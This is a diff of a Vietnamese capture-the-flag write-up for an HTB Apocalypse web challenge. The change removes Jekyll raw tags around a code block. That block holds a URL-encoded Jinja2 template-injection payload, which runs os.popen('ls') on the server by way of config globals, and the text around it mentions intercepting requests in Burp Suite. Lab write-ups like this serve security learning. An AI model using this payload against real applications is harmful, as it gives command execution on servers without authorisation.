@@ -229,11 +229,10 @@ Sau khi gửi form, bên `Intercept` của `BurpSuite` sẽ hiển thị
 ![trialbyfirehint3](/assets/images/HTB-Apocalypse/Web/web_trial_by_fire/trialbyfirehint3.png)
 
 Có vẻ như server dùng URL encode, ta sẽ encode lại payload ĐẦY ĐỦ của mình
-{% raw %}
+
 ```
 %7B%7Bconfig.__class__.__init__.__globals__%5B'os'%5D.popen('ls').read()%7D%7D
 ```
-{% endraw %}
 
 Sau khi đổi payload ta sẽ được
 
